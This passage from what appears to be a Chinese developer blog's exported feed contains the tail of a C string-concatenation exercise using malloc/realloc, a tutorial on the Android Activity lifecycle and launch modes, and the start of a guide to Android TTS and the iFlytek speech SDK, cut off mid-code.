<p>搜这个题目的时候，看到别人提出的问题，确实有些道理啊。由于题目中并没有对”无冗余“的含义做出解释，我们可以把它理解为不占用多余的内存空间来存储输入的字符串。方案一直接定义字符数组，无法实现无冗余，因为数组大小已经固定，但是不一定有那么多字符，因此会造成空间的浪费。就想到用动态内存分配函数malloc和realloc来实现”无冗余“。</p>
<p>malloc：向系统申请分配指定size个字节的内存空间。返回类型是 void* 类型。</p>
<p>realloc：对malloc申请的内存进行大小的调整.</p>
<p>然后，由于上面已经发现了这个题的一个取巧的办法，所以这里将题目格式稍作更改，算是一个改编吧。</p>
<p>样例输入：</p>
<p>abc</p>
<p>def</p>
<p>样例输出：</p>
<p>abcdef</p>
<h5 id="C语言实现-1"><a href="#C语言实现-1" class="headerlink" title="C语言实现"></a>C语言实现</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getString</span><span class="params">(<span class="keyword">char</span> *str)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> len = <span class="number">1</span>;</div><div class="line">    <span class="keyword">char</span> m;</div><div class="line">    <span class="keyword">while</span>((m = getchar()) != <span class="string">'\n'</span>)</div><div class="line">    &#123;</div><div class="line">        str = (<span class="keyword">char</span> *)<span class="built_in">realloc</span>(str,<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*len);</div><div class="line">        *(str+len<span class="number">-1</span>) = m;</div><div class="line">        len++;</div><div class="line">    &#125;</div><div class="line">    str = (<span class="keyword">char</span> *)<span class="built_in">realloc</span>(str,<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*len);</div><div class="line">    *(str+len<span class="number">-1</span>) = <span class="string">'\0'</span>;</div><div class="line">    <span class="keyword">return</span> len;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> len1,len2,k;</div><div class="line">    <span class="keyword">char</span> m,n;</div><div class="line">    <span class="keyword">char</span> *str1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</div><div class="line">    <span class="keyword">char</span> *str2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</div><div class="line"></div><div class="line">    len1 = getString(str1);</div><div class="line">    len2 = getString(str2);</div><div class="line"></div><div class="line">    str1 =  (<span class="keyword">char</span> *)<span class="built_in">realloc</span>(str1,<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*(len1+len2<span class="number">-1</span>));</div><div class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;len2;k++)</div><div class="line">    &#123;</div><div class="line">        *(str1+len1+k<span class="number">-1</span>) = *(str2+k);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,str1);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>算法学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Activity 生命周期与启动模式</title>
    <url>/2016/08/09/Android%20Activity%20%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E4%B8%8E%E5%90%AF%E5%8A%A8%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>　　Android 程序的生命周期是由系统控制而非程序自身直接控制，因此了解和管理 Activity 的生命周期对于Android 应用程序开发来说都是十分重要的。本文通过实例演示了 Activity 的生命周期，并对 Android 的任务栈设计以及 Activity 的启动模式进行了介绍。</p>
<a id="more"></a>
<h4 id="Activity生命周期"><a href="#Activity生命周期" class="headerlink" title="Activity生命周期"></a>Activity生命周期</h4><p>　　官方文档对 Activity 的生命周期进行了详细的描述，其中，示意图如下：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/9-1.png" alt="9-1"></p>
<p>　　在 Activity 的生命周期里会调用以下方法，具体的描述如下表：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>onCreat()</td>
<td>当activity启动时调用</td>
</tr>
<tr>
<td>onStart()</td>
<td>当activity对用户来说可见时调用</td>
</tr>
<tr>
<td>onResume()</td>
<td>当activity将要开始与用户进行交互时调用</td>
</tr>
<tr>
<td>onPause()</td>
<td>当系统将要开始恢复以前的activity时调用。</td>
</tr>
<tr>
<td>onStop()</td>
<td>当activity不再对用户可见时调用，因为另一个活动已恢复，并覆盖了这一个。 </td>
</tr>
<tr>
<td>onRestart()</td>
<td>当一个activity被停止后，被重新启动时调用</td>
</tr>
<tr>
<td>onDestroy()</td>
<td>当activity被销毁时调用 </td>
</tr>
</tbody>
</table>
<p>　　我们通过重写以上7个方法来观察各个方法的执行情况（MianActivity.java）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> Button mButton;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line">        System.out.println(<span class="string">"MainActivity: onCreate()"</span>);</div><div class="line">        </div><div class="line">        mButton = (Button) findViewById(R.id.btn_to_another);</div><div class="line">        </div><div class="line">        mButton.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</div><div class="line">        </div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</div><div class="line">                <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">                Intent intent = <span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>,AnotherActivity.class);</div><div class="line">                startActivity(intent);</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStart</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        <span class="keyword">super</span>.onStart();</div><div class="line">        System.out.println(<span class="string">"MainActivity: onStart()"</span>);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onResume</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        <span class="keyword">super</span>.onResume();</div><div class="line">        System.out.println(<span class="string">"MainActivity: onResume()"</span>);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPause</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        <span class="keyword">super</span>.onPause();</div><div class="line">        System.out.println(<span class="string">"MainActivity: onPause()"</span>);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onRestart</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        <span class="keyword">super</span>.onRestart();</div><div class="line">        System.out.println(<span class="string">"MainActivity: onRestart()"</span>);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStop</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        <span class="keyword">super</span>.onStop();</div><div class="line">        System.out.println(<span class="string">"MainActivity: onStop()"</span>);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        <span class="keyword">super</span>.onDestroy();</div><div class="line">        System.out.println(<span class="string">"MainActivity: onDestroy()"</span>);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　AnotherActivity 的代码与 MainActivity 的代码基本相同，在这里就不再贴代码了。以下是运行程序之后各个情况下的控制台输出：</p>
<h5 id="App启动时"><a href="#App启动时" class="headerlink" title="App启动时"></a>App启动时</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">MainActivity: onCreat()</div><div class="line">MainActivity: onStart()</div><div class="line">MainActivity: onResume()</div></pre></td></tr></table></figure>
<h5 id="锁屏或者按下Home键时"><a href="#锁屏或者按下Home键时" class="headerlink" title="锁屏或者按下Home键时"></a>锁屏或者按下Home键时</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">MainActivity: onPause()</div><div class="line">MainActivity: onStop()</div></pre></td></tr></table></figure>
<h5 id="解锁或者返回到App时"><a href="#解锁或者返回到App时" class="headerlink" title="解锁或者返回到App时"></a>解锁或者返回到App时</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">MainActivity: onRestart()</div><div class="line">MainActivity: onStart()</div><div class="line">MainActivity: onResume()</div></pre></td></tr></table></figure>
<h5 id="按下Back键时"><a href="#按下Back键时" class="headerlink" title="按下Back键时"></a>按下Back键时</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">MainActivity: onPause()</div><div class="line">MainActivity: onStop()</div><div class="line">MainActivity: onDestroy()</div></pre></td></tr></table></figure>
<h5 id="按下跳转到AnotherActivity按钮时"><a href="#按下跳转到AnotherActivity按钮时" class="headerlink" title="按下跳转到AnotherActivity按钮时"></a>按下跳转到AnotherActivity按钮时</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">MainActivity: onPause()</div><div class="line">AnotherActivity: onCreat()</div><div class="line">AnotherActivity: onStart()</div><div class="line">AnotherActivity: onResume()</div><div class="line">MainActivity: onStop()</div></pre></td></tr></table></figure>
<h5 id="按下跳转到MainActivity按钮时"><a href="#按下跳转到MainActivity按钮时" class="headerlink" title="按下跳转到MainActivity按钮时"></a>按下跳转到MainActivity按钮时</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">AnotherActivity: onPause()</div><div class="line">MainActivity: onCreat()</div><div class="line">MainActivity: onStart()</div><div class="line">MainActivity: onResume()</div><div class="line">AnotherActivity: onStop()</div></pre></td></tr></table></figure>
<p>　　可以看到，我们在跳转到 AnotherActivity 时 MainActivity 并没有被 Destroy 掉，但是我们按下跳转到 MainActivity 的按钮时执行了 onCeate() 方法，即重新创建了一个 MainActivity 实例，这是为什么呢？其实，这就和 Activity 的启动模式有关了，请看下文 Activity 的启动模式。</p>
<h5 id="再按下Back键时"><a href="#再按下Back键时" class="headerlink" title="再按下Back键时"></a>再按下Back键时</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">MainActivity: onPause()</div><div class="line">AnotherActivity: onRestart()</div><div class="line">AnotherActivity: onStart()</div><div class="line">AnotherActivity: onResume()</div><div class="line">MainActivity: onStop()</div><div class="line">MainActivity: onDestroy()</div></pre></td></tr></table></figure>
<p>　　注意看，我们在不同的 Activity 之间切换时，都是先执行的本 Activity 的 onPause() 方法，待新的 Activity 创建启动并显示出来之后，才执行本 Activity 的 onStop() 方法，这样的生命周期设计是有他的道理的，首先防止同时显示两个 Activity，然后防止另一个 Activity 启动失败，导致出现黑屏的情况。</p>
<h4 id="Activity四种启动模式"><a href="#Activity四种启动模式" class="headerlink" title="Activity四种启动模式"></a>Activity四种启动模式</h4><p>　　Android 采用 Task 来管理多个 Activity，任务栈（task stack），又称为后退栈（back stack），记录存放用户开启的 Activity 的。在 Android 操作系统里面会存在多个任务栈，应用程序一被开启系统就给他分配一个任务栈，当所有的 Activity 都退出的时候，任务栈就清空了，置于栈顶的 Activity 就是用户看到的 Activity。</p>
<h5 id="standard模式"><a href="#standard模式" class="headerlink" title="standard模式"></a>standard模式</h5><p>　　默认模式，可以不用写配置。在这个模式下，每次激活 Activity 都会默认创建一个新的实例。因此，在这种模式下，可以有多个相同的实例，也允许多个相同 Activity 叠加。</p>
<h5 id="singleTop模式"><a href="#singleTop模式" class="headerlink" title="singleTop模式"></a>singleTop模式</h5><p>　　可以有多个实例，但是不允许多个相同 Activity 叠加。分为两种情况：</p>
<ol>
<li><p>如果 Activity 在栈顶的时候，启动相同的 Activity，不会创建新的实例，而会调用其 onNewIntent 方法。</p>
</li>
<li><p>如果 Activity 不在栈顶的时候，启动 Activity 时会创建新的实例。</p>
</li>
</ol>
<h5 id="singleTask模式"><a href="#singleTask模式" class="headerlink" title="singleTask模式"></a>singleTask模式</h5><p>　　只有一个实例。分为三种情况：</p>
<ol>
<li><p>如果启动的目标 Activity 不存在 Task 栈中,系统将会创建一个目标 Activity 实例,并将它加入到Task栈顶。</p>
</li>
<li><p>如果启动的目标 Activity 已存在 Task 栈顶,此时模式和 singleTop 模式相同。</p>
</li>
<li><p>若果启动的目标 Activity 已存在但没有位于Task栈顶,系统将会把该目标 Activity 上面的所有 Activity 移除 Task 栈,使该 Activity 置于 Task 栈顶。</p>
</li>
</ol>
<h5 id="singleInstance模式"><a href="#singleInstance模式" class="headerlink" title="singleInstance模式"></a>singleInstance模式</h5><p>　　只有一个实例，并且这个实例独立运行在一个 Task 中，这个 Task 只有这个实例，不允许有别的 Activity 存在。</p>
<p>　　此启动模式和我们使用的浏览器工作原理类似，我们都知道在多个程序中访问浏览器时，如果当前浏览器没有打开，则打开浏览器，否则会在当前打开的浏览器中访问。此模式会节省大量的系统资源，因为他能保证要请求的 Activity 对象在当前的栈中只存在一个。</p>
<h5 id="配置启动模式"><a href="#配置启动模式" class="headerlink" title="配置启动模式"></a>配置启动模式</h5><p>　　Android Activity 的启动方式可以在 AndroidManifest.xml 文件的 Activity 标签中的 android:launchMode 属性进行配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">"com.example.activitydemo.MainActivity"</span></span></div><div class="line">    <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> </div><div class="line">    <span class="attr">android:launchMode</span>=<span class="string">"standard"</span>&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></div></pre></td></tr></table></figure>
<p>　　有兴趣的话也可以自己写一个小的 Demo 来对这四种启动模式进行测试，通过创建几个 Activity 以及切换按钮，然后在各个 Activity 的 onCreat() 方法中写入下面的语句来打印 Activity 实例的标识信息：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">System.out.println(toString());</div></pre></td></tr></table></figure>
<p>　　通过控制台打印的内容我们可以区分 Activity 启动时是否创建了新的实例。</p>
<p>　　通过了解 Android Activity 的启动模式，我们就可以回答上文中 Activity 生命周期中留下的问题啦，因为Activity 默认配置上启动模式是：standard，因此我们每次启动 Activity 都会创建新的实例。为 Activity 选择合适的启动模式可以节省更多的资源，这对于应用程序开发很重要。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Activity</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 自带 TTS 与科大讯飞语音 SDK</title>
    <url>/2016/08/08/Android%20%E8%87%AA%E5%B8%A6%20TTS%20%E4%B8%8E%E7%A7%91%E5%A4%A7%E8%AE%AF%E9%A3%9E%E8%AF%AD%E9%9F%B3%20SDK/</url>
    <content><![CDATA[<p>　　Text-To-Speach 简称 TTS，指能够将指定的文本转换成不同的语言音频输出的技术。通过 TTS 技术我们可以为我们的应用添加语音提醒功能，也可以做具备朗读功能的电子词典或者电子书阅读器等，总之，语音合成、语音识别等技术的应用范围还是很广的。本博客主要介绍 Android 自带的 TTS 库以及科大讯飞语音 SDK 的使用。</p>
<a id="more"></a>
<h4 id="Android-TTS技术"><a href="#Android-TTS技术" class="headerlink" title="Android TTS技术"></a>Android TTS技术</h4><p>　　Android 的 TTS 可以将文本随意的转换成以下任意五种语言（English、French、German、Italian和Spanish）的语音输出。很可惜，没有中文的，但是也不用担心，后面我们会介绍其他的办法。先来使用 Android 系统自带的 TTS 库，实现起来很简单，示例如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">    setContentView(R.layout.activity_main);</div><div class="line">    </div><div class="line">    mButton = (Button) findViewById(R.id.btn_speak);</div><div class="line">    </div><div class="line">    <span class="comment">// 创建TTS对象</span></div><div class="line">    mSpeech = <span class="keyword">new</span> TextToSpeech(MainActivity.<span class="keyword">this</span>, <span class="keyword">new</span> OnInitListener() &#123;</div><div class="line">    </div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onInit</span><span class="params">(<span class="keyword">int</span> status)</span> </span>&#123;</div><div class="line">            <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">            <span class="keyword">if</span> (status == TextToSpeech.SUCCESS) &#123;</div><div class="line">            mSpeech.setLanguage(Locale.ENGLISH);    <span class="comment">//设置语言为英语</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">    </div><div class="line">    <span class="comment">//点击按钮说话</span></div><div class="line">    mButton.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</div><div class="line">    </div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</div><div class="line">            <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">            mSpeech.speak(<span class="string">"Hello World!"</span>, TextToSpeech.QUEUE_FLUSH, <span class="keyword">null</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　运行程序化后点击按钮你就会听到 Hello World！，除此之外还可以设置语速、语调等参数，具体的可以参考官方文档：<a href="http://www.android-doc.com/reference/android/speech/tts/package-summary.html" target="_blank" rel="external">http://www.android-doc.com/reference/android/speech/tts/package-summary.html</a></p>
<h4 id="科大讯飞语音SDK"><a href="#科大讯飞语音SDK" class="headerlink" title="科大讯飞语音SDK"></a>科大讯飞语音SDK</h4><p>　　Android 自带的 TTS 是不支持中文的，但是国内也有很强大的公司在做语音识别，比如众所周知的科大迅飞，它提供了免费的 SDK，很多 App 也都集成了科大讯飞的语音引擎，这里我们也来简单使用一下。</p>
<h5 id="下载科大讯飞Android开发SDK"><a href="#下载科大讯飞Android开发SDK" class="headerlink" title="下载科大讯飞Android开发SDK"></a>下载科大讯飞Android开发SDK</h5><p>　　官方地址：<a href="http://www.xfyun.cn/" target="_blank" rel="external">http://www.xfyun.cn/</a></p>
<h5 id="添加jar包"><a href="#添加jar包" class="headerlink" title="添加jar包"></a>添加jar包</h5><p>　　将开发工具包中 libs 目录下的 Msc.jar 和 armeabi 复制到 Android 工程的 libs 目录。</p>
<h5 id="具体配置步骤"><a href="#具体配置步骤" class="headerlink" title="具体配置步骤"></a>具体配置步骤</h5><p>　　可查看开发工具包中doc文件夹下的 MSC Develop Manual for Android.pdf 文件，里面有详细的介绍。</p>
<p>（1）在工程 AndroidManifest.xml 文件中添加如下权限</p>
<p>　　文档中还添加了很多其他权限，本博客只介绍了 SDK 中语音合成功能的使用，如果你需要用到其他的功能那那些权限也是必须要添加的。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 连接网络权限，用于执行云端语音能力 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span> /&gt;</span></div><div class="line"><span class="comment">&lt;!-- 读取网络信息状态 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_NETWORK_STATE"</span> /&gt;</span></div><div class="line"><span class="comment">&lt;!-- 获取当前wifi状态 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_WIFI_STATE"</span> /&gt;</span></div><div class="line"><span class="comment">&lt;!-- 允许程序改变网络连接状态 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.CHANGE_NETWORK_STATE"</span> /&gt;</span></div><div class="line"><span class="comment">&lt;!-- 外存储读权限，构建语法需要用到此权限 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_EXTERNAL_STORAGE"</span> /&gt;</span></div><div class="line"><span class="comment">&lt;!-- 外存储写权限，构建语法需要用到此权限 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span> /&gt;</span></div></pre></td></tr></table></figure>
<p>（2）初始化SDK</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">SpeechUtility.createUtility(context, SpeechConstant.APPID + <span class="string">"=你申请的APPID"</span>);</div></pre></td></tr></table></figure>
<p>（3）语音合成基本配置（摘抄自官方文档）</p>
<p>　　语音合成是将文字信息转化为可听的声音信息，让机器像人一样开口说话。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="comment">//1.创建 SpeechSynthesizer 对象, 第二个参数：本地合成时传 InitListener</span></div><div class="line">SpeechSynthesizer mTts= SpeechSynthesizer.createSynthesizer(context, <span class="keyword">null</span>);</div><div class="line"><span class="comment">//2.合成参数设置</span></div><div class="line">mTts.setParameter(SpeechConstant.VOICE_NAME, <span class="string">"xiaoyan"</span>); <span class="comment">//设置发音人</span></div><div class="line">mTts.setParameter(SpeechConstant.SPEED, <span class="string">"50"</span>);<span class="comment">//设置语速</span></div><div class="line">mTts.setParameter(SpeechConstant.VOLUME, <span class="string">"80"</span>);<span class="comment">//设置音量，范围 0~100</span></div><div class="line">mTts.setParameter(SpeechConstant.ENGINE_TYPE, SpeechConstant.TYPE_CLOUD); </div><div class="line"><span class="comment">//设置合成音频保存位置（可自定义保存位置） ，保存在“./sdcard/iflytek.pcm”</span></div><div class="line">mTts.setParameter(SpeechConstant.TTS_AUDIO_PATH, <span class="string">"./sdcard/iflytek.pcm"</span>);</div><div class="line"><span class="comment">//3.开始合成</span></div><div class="line">mTts.startSpeaking(<span class="string">"科大讯飞，让世界聆听我们的声音"</span>, mSynListener);</div><div class="line"></div><div class="line"><span class="comment">//合成监听器</span></div><div class="line"><span class="keyword">private</span> SynthesizerListener mSynListener = <span class="keyword">new</span> SynthesizerListener()&#123;</div><div class="line">    <span class="comment">//会话结束回调接口，没有错误时，error为null</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCompleted</span><span class="params">(SpeechError error)</span> </span>&#123;&#125;</div><div class="line">    <span class="comment">//缓冲进度回调</span></div><div class="line">    <span class="comment">//percent为缓冲进度0~100，beginPos为缓冲音频在文本中开始位置，endPos表示缓冲音频在</span></div><div class="line">    文本中结束位置，info为附加信息。</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBufferProgress</span><span class="params">(<span class="keyword">int</span> percent, <span class="keyword">int</span> beginPos, <span class="keyword">int</span> endPos, String info)</span> </span>&#123;&#125;</div><div class="line">    <span class="comment">//开始播放</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSpeakBegin</span><span class="params">()</span> </span>&#123;&#125;</div><div class="line">    <span class="comment">//暂停播放</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSpeakPaused</span><span class="params">()</span> </span>&#123;&#125;</div><div class="line">    <span class="comment">//播放进度回调</span></div><div class="line">    <span class="comment">//percent为播放进度0~100,beginPos为播放音频在文本中开始位置，endPos表示播放音频在文</span></div><div class="line">    本中结束位置.</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSpeakProgress</span><span class="params">(<span class="keyword">int</span> percent, <span class="keyword">int</span> beginPos, <span class="keyword">int</span> endPos)</span> </span>&#123;&#125;</div><div class="line">    <span class="comment">//恢复播放回调接口</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSpeakResumed</span><span class="params">()</span> </span>&#123;&#125;</div><div class="line">    <span class="comment">//会话事件回调接口</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onEvent</span><span class="params">(<span class="keyword">int</span> arg0, <span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2, Bundle arg3)</span> </span>&#123;&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h4 id="简单的Demo"><a href="#简单的Demo" class="headerlink" title="简单的Demo"></a>简单的Demo</h4><p>　　博主使用科大讯飞 SDK 的语音合成功能制作了一个简单的 Demo，它可以选择不同的发音人来发音，并且可以调节语速和音量。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/8/8-1.png" alt="8-1"></p>
<p>　　以下是 MainActivity.java 的部分代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">    setContentView(R.layout.activity_main);</div><div class="line">    <span class="comment">//初始化SDK</span></div><div class="line">    SpeechUtility.createUtility(<span class="keyword">this</span>, SpeechConstant.APPID + <span class="string">"=571771fd"</span>);</div><div class="line">    </div><div class="line">    mEditText = (EditText) findViewById(R.id.et_speak);</div><div class="line">    mButton = (Button) findViewById(R.id.btn_speak);</div><div class="line">    mSeekBarVolume = (SeekBar) findViewById(R.id.sb_speak_volume);</div><div class="line">    mSeekBarSpeed = (SeekBar) findViewById(R.id.sb_speak_speed);</div><div class="line">    mSpinner = (Spinner) findViewById(R.id.spinner);</div><div class="line">    </div><div class="line">    <span class="comment">// 创建 SpeechSynthesizer 对象, 第二个参数：本地合成时传 InitListener</span></div><div class="line">    mTts = SpeechSynthesizer.createSynthesizer(<span class="keyword">this</span>, <span class="keyword">null</span>);</div><div class="line">    <span class="comment">// 合成参数设置</span></div><div class="line">    mTts.setParameter(SpeechConstant.VOICE_NAME, <span class="string">"xiaoyan"</span>); <span class="comment">// 设置发音人</span></div><div class="line">    mTts.setParameter(SpeechConstant.SPEED, <span class="string">"50"</span>);<span class="comment">// 设置语速</span></div><div class="line">    mTts.setParameter(SpeechConstant.VOLUME, <span class="string">"80"</span>);<span class="comment">// 设置音量，范围 0~100</span></div><div class="line">    mTts.setParameter(SpeechConstant.ENGINE_TYPE, SpeechConstant.TYPE_CLOUD);     <span class="comment">// 设置云端</span></div><div class="line"></div><div class="line">    <span class="comment">// 设置合成音频保存位置（可自定义保存位置） ，保存在“./sdcard/iflytek.pcm”</span></div><div class="line">    mTts.setParameter(SpeechConstant.TTS_AUDIO_PATH, <span class="string">"./sdcard/iflytek.wav"</span>);</div><div class="line">    </div><div class="line">    mSeekBarSpeed.setProgress(<span class="number">50</span>);</div><div class="line">    mSeekBarVolume.setProgress(<span class="number">80</span>);</div><div class="line">    </div><div class="line">    mSpinner.setOnItemSelectedListener(<span class="keyword">new</span> OnItemSelectedListener() &#123;</div><div class="line">    </div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onItemSelected</span><span class="params">(AdapterView&lt;?&gt; arg0, View arg1,<span class="keyword">int</span> position, <span class="keyword">long</span> arg3)</span> </span>&#123;</div><div class="line">            <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">            <span class="comment">// 设置发音人</span></div><div class="line">            mTts.setParameter(SpeechConstant.VOICE_NAME, str[position]); </div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onNothingSelected</span><span class="params">(AdapterView&lt;?&gt; arg0)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        </div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div 